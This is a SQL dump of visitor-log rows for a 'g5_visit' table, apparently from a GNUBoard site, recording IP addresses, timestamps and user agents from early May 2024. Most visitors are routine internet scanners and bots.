INSERT INTO `g5_visit` VALUES ('1694', '162.216.149.228', '2024-05-02', '03:26:46', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1695', '134.209.179.128', '2024-05-02', '04:14:42', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1696', '168.232.12.228', '2024-05-02', '05:37:29', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1697', '59.178.108.255', '2024-05-02', '07:13:53', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1698', '45.142.182.96', '2024-05-02', '07:38:33', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1699', '61.32.31.241', '2024-05-02', '08:31:58', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Whale/3.25.232.19 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1700', '87.236.176.32', '2024-05-02', '09:39:27', '', 'Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1701', '198.235.24.150', '2024-05-02', '09:53:44', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1702', '146.19.24.28', '2024-05-02', '10:49:32', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1703', '198.235.24.214', '2024-05-02', '11:03:04', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1704', '104.199.68.30', '2024-05-02', '11:05:01', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1705', '185.191.126.213', '2024-05-02', '14:25:08', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1706', '205.210.31.146', '2024-05-02', '18:38:08', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1707', '139.59.188.197', '2024-05-02', '18:42:57', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1708', '35.203.210.159', '2024-05-02', '18:49:11', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1709', '4.242.130.211', '2024-05-02', '20:31:29', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1710', '168.76.20.229', '2024-05-02', '20:44:41', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1711', '64.62.197.206', '2024-05-02', '20:52:49', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1712', '45.83.66.26', '2024-05-02', '21:41:47', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1713', '51.254.59.113', '2024-05-02', '22:41:33', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1714', '146.19.24.28', '2024-05-03', '00:09:59', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1715', '159.223.225.251', '2024-05-03', '00:22:29', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1716', '192.241.207.62', '2024-05-03', '00:59:25', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1717', '45.156.129.48', '2024-05-03', '01:12:00', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1718', '185.224.128.43', '2024-05-03', '01:43:39', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1719', '46.174.191.28', '2024-05-03', '03:06:30', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1720', '103.203.57.1', '2024-05-03', '03:44:18', '', 'HTTP Banner Detection (https://security.ipip.net)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1721', '179.1.64.146', '2024-05-03', '04:13:54', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1722', '185.191.126.213', '2024-05-03', '04:28:14', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1723', '205.210.31.32', '2024-05-03', '04:29:43', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1724', '185.16.38.111', '2024-05-03', '04:49:24', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1725', '161.35.0.120', '2024-05-03', '06:37:59', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1726', '178.62.242.51', '2024-05-03', '08:51:11', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1727', '64.62.156.91', '2024-05-03', '09:22:32', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1728', '205.210.31.98', '2024-05-03', '11:33:20', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1729', '198.235.24.186', '2024-05-03', '11:39:19', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1730', '35.203.211.102', '2024-05-03', '12:34:28', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1731', '167.94.145.105', '2024-05-03', '12:43:35', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1732', '61.32.31.241', '2024-05-03', '12:55:59', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Whale/3.25.232.19 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1733', '118.235.5.26', '2024-05-03', '13:09:18', '', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1734', '205.210.31.107', '2024-05-03', '13:13:21', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1735', '167.248.133.127', '2024-05-03', '14:10:49', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1736', '162.216.150.46', '2024-05-03', '14:37:30', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1737', '167.94.138.127', '2024-05-03', '15:20:40', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1738', '185.180.143.138', '2024-05-03', '15:26:16', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1739', '193.106.29.125', '2024-05-03', '15:58:40', '', 'Mozilla/5.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1740', '117.211.250.176', '2024-05-03', '16:18:45', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1741', '139.162.251.91', '2024-05-03', '16:23:20', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1742', '179.43.188.106', '2024-05-03', '18:04:02', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1743', '205.210.31.147', '2024-05-03', '19:06:36', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1744', '185.180.140.4', '2024-05-03', '19:38:55', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1745', '167.94.146.63', '2024-05-03', '19:50:54', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1746', '186.68.126.79', '2024-05-03', '20:21:57', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1747', '185.89.156.113', '2024-05-03', '20:48:34', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1748', '185.180.143.136', '2024-05-03', '21:00:30', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1749', '167.94.145.108', '2024-05-03', '23:42:35', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1750', '34.140.108.54', '2024-05-04', '00:08:26', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1751', '35.216.152.157', '2024-05-04', '00:32:53', '', 'Mozilla/5.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1752', '167.94.145.96', '2024-05-04', '00:53:56', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1753', '106.75.93.23', '2024-05-04', '02:31:23', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1754', '138.68.183.135', '2024-05-04', '02:52:24', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1755', '185.16.38.111', '2024-05-04', '02:54:54', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1756', '185.242.226.10', '2024-05-04', '03:09:34', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1757', '185.224.128.43', '2024-05-04', '03:36:53', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1758', '179.43.188.106', '2024-05-04', '04:17:18', '', 'Go-http-client/1.1', '', '', '');
INSERT INTO `g5_visit` VALUES ('1759', '94.156.79.234', '2024-05-04', '05:05:57', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1760', '35.203.211.224', '2024-05-04', '05:39:43', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1761', '162.243.136.35', '2024-05-04', '05:56:53', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1762', '185.191.126.213', '2024-05-04', '06:19:56', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1763', '177.130.40.18', '2024-05-04', '06:27:42', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1764', '146.19.24.28', '2024-05-04', '06:40:08', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1765', '46.174.191.28', '2024-05-04', '06:43:48', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1766', '45.89.190.114', '2024-05-04', '06:56:49', '', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1767', '205.210.31.50', '2024-05-04', '06:58:22', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1768', '198.235.24.144', '2024-05-04', '10:06:28', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1769', '35.203.210.187', '2024-05-04', '11:20:46', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1770', '65.49.1.108', '2024-05-04', '12:36:47', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1771', '192.81.132.50', '2024-05-04', '14:53:59', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1772', '113.128.64.40', '2024-05-04', '14:59:45', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1773', '49.113.93.82', '2024-05-04', '15:00:08', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1774', '222.94.32.201', '2024-05-04', '15:00:21', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1775', '198.235.24.135', '2024-05-04', '15:58:44', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1776', '35.187.98.121', '2024-05-04', '16:21:58', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1777', '46.174.191.30', '2024-05-04', '17:49:36', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1778', '167.94.138.122', '2024-05-04', '18:54:34', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1779', '162.216.149.146', '2024-05-04', '19:22:42', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1780', '162.142.125.215', '2024-05-04', '20:49:51', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1781', '35.216.167.199', '2024-05-04', '21:18:05', '', 'abuse.xmco.fr', '', '', '');
INSERT INTO `g5_visit` VALUES ('1782', '87.236.176.190', '2024-05-04', '23:27:45', '', 'Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1783', '185.16.38.111', '2024-05-05', '00:07:35', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1784', '179.43.188.106', '2024-05-05', '00:11:28', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1785', '185.224.128.43', '2024-05-05', '00:33:48', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1786', '146.19.24.28', '2024-05-05', '01:53:04', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1787', '118.194.250.22', '2024-05-05', '04:06:34', '', 'curl/7.29.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1788', '34.77.99.191', '2024-05-05', '06:10:05', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1789', '96.126.101.33', '2024-05-05', '06:21:47', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1790', '165.154.120.203', '2024-05-05', '07:27:47', '', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.38 (KHTML, like Gecko) Chrome/96.0.672 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1791', '192.241.222.97', '2024-05-05', '09:20:52', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1792', '198.235.24.92', '2024-05-05', '10:10:33', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1793', '172.214.141.49', '2024-05-05', '10:10:49', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1794', '161.35.71.171', '2024-05-05', '10:16:47', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1795', '35.203.210.25', '2024-05-05', '10:42:57', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1796', '207.154.219.211', '2024-05-05', '10:58:29', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1797', '142.4.218.114', '2024-05-05', '11:37:23', '', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1798', '213.32.39.47', '2024-05-05', '11:50:30', '', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1799', '198.235.24.149', '2024-05-05', '12:04:55', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1800', '5.196.102.76', '2024-05-05', '12:57:02', '', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1801', '15.204.31.75', '2024-05-05', '13:07:42', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1802', '5.196.102.77', '2024-05-05', '13:15:37', '', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1803', '198.235.24.29', '2024-05-05', '16:39:39', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1804', '162.216.150.141', '2024-05-05', '16:59:30', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1805', '185.213.175.171', '2024-05-05', '18:45:11', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1806', '64.62.156.40', '2024-05-05', '18:51:47', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15', '', '', '');
INSERT INTO `g5_visit` VALUES ('1807', '46.174.191.30', '2024-05-05', '23:56:01', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1808', '178.75.42.71', '2024-05-06', '00:54:39', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', '', '', '');
INSERT INTO `g5_visit` VALUES ('1809', '138.197.179.92', '2024-05-06', '02:07:43', '', 'Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1810', '199.45.154.74', '2024-05-06', '02:13:45', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1811', '185.224.128.43', '2024-05-06', '02:30:11', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1812', '185.16.38.111', '2024-05-06', '02:39:35', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1813', '78.29.19.18', '2024-05-06', '03:50:50', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1814', '159.223.84.115', '2024-05-06', '04:24:55', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1815', '64.226.121.172', '2024-05-06', '04:34:14', '', 'Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1816', '205.210.31.135', '2024-05-06', '04:36:53', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1817', '146.19.24.28', '2024-05-06', '04:54:43', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1818', '185.242.226.10', '2024-05-06', '05:21:35', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1819', '198.235.24.235', '2024-05-06', '07:01:19', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1820', '94.103.183.79', '2024-05-06', '07:31:26', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1821', '162.216.149.100', '2024-05-06', '07:51:39', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1822', '179.43.188.106', '2024-05-06', '09:09:24', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1823', '185.191.126.213', '2024-05-06', '09:31:40', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1824', '46.174.191.32', '2024-05-06', '11:24:28', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1825', '168.76.20.229', '2024-05-06', '12:11:17', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1826', '51.158.205.47', '2024-05-06', '12:35:02', '', 'masscan/1.3 (https://github.com/robertdavidgraham/masscan)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1827', '193.106.29.125', '2024-05-06', '12:47:57', '', 'Mozilla/5.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1828', '20.127.146.25', '2024-05-06', '13:44:06', '', 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30', '', '', '');
INSERT INTO `g5_visit` VALUES ('1829', '192.241.193.50', '2024-05-06', '16:26:53', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1830', '104.152.52.162', '2024-05-06', '18:24:42', '', 'masscan/1.3 (https://github.com/robertdavidgraham/masscan)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1831', '198.235.24.159', '2024-05-06', '19:23:59', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1832', '71.6.146.186', '2024-05-06', '19:42:01', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1833', '45.128.232.213', '2024-05-06', '20:08:20', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.82', '', '', '');
